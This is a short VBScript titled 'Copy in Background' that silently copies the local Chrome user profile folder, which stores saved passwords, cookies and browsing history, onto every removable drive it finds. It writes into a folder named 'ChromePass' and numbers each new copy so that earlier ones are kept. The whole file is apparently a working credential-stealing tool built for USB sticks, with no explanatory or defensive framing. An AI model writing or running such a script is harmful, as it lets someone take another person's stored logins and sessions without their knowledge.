' Copy in Background

Const TYPE_REMOVABLE = 1

Set oShell = CreateObject("Wscript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

sourceP = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%/google/chrome/User Data/Default")

With CreateObject("Scripting.FileSystemObject")
    For Each Drive In .Drives
        If Drive.DriveType = TYPE_REMOVABLE Then
        	desigP = Drive.DriveLetter & ":\ChromePass/Folder"

        	i = -1
			If fso.FolderExists(desigP) Then
			  Do
			    i = i + 1
			    newname = desigP & Right("000" & i, 3)
			  Loop While fso.FolderExists(newname)
			  desigP = newname
			End If


            .CopyFolder sourceP, desigP, True
        End If
    Next
End With